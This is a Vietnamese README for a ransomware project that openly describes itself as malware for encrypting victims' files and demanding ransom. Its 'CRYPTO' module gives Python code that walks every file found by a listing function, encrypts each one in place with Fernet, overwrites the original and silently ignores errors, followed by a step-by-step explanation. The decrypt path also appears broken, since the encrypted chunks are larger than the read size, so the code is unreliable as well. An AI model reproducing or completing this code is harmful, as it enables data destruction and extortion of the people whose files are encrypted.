# RANSOMWARE
Chương trình ransomware, một loại phần mềm độc hại thường sử dụng để mã hóa các tệp trên máy tính của người dùng và yêu cầu một khoản tiền chuộc để giải mã chúng.

## MODULES
**1.CRYPTO**
```python
def Process_Files(Private: Fernet, mode: str):
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception as e: pass
            finally:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)
```
1.Hàm *Process_Files* nhận vào hai tham số: *Private*, một đối tượng *Fernet* được sử dụng để mã hóa và giải mã, và *mode*, một chuỗi chỉ định chế độ hoạt động (‘encrypt’ hoặc ‘decrypt’).

2.Hàm này sẽ duyệt qua tất cả các tệp tin được trả về bởi hàm *List_Files*.

3.Đối với mỗi tệp, nó tạo một tệp tạm thời với tên là tên tệp gốc kèm theo ‘.temp’.

4.Nó mở tệp gốc để đọc và tệp tạm thời để ghi, với kích thước bộ đệm là 4096*1024 byte. Sử dụng mmap để ánh xạ tệp gốc vào bộ nhớ. 
Sau đó đọc và xử lý từng ‘chunk’ của tệp gốc, với kích thước ‘chunk’ là 4096*1024 byte.

5.Mỗi ‘chunk’ sau đó được mã hóa (nếu mode là ‘encrypt’) hoặc giải mã (nếu mode là ‘decrypt’) bằng cách sử dụng đối tượng Fernet, và sau đó được ghi vào tệp tạm thời.

6.Khi tất cả các ‘chunk’ đã được xử lý, tệp tạm thời được đổi tên thành tên của tệp gốc, thay thế tệp gốc. Nếu có lỗi xảy ra trong quá trình này, hàm sẽ bỏ qua lỗi và tiếp tục với tệp tiếp theo. Cuối cùng, nếu tệp tạm thời vẫn tồn tại (ví dụ, do một lỗi xảy ra), nó sẽ được xóa.



```python
```
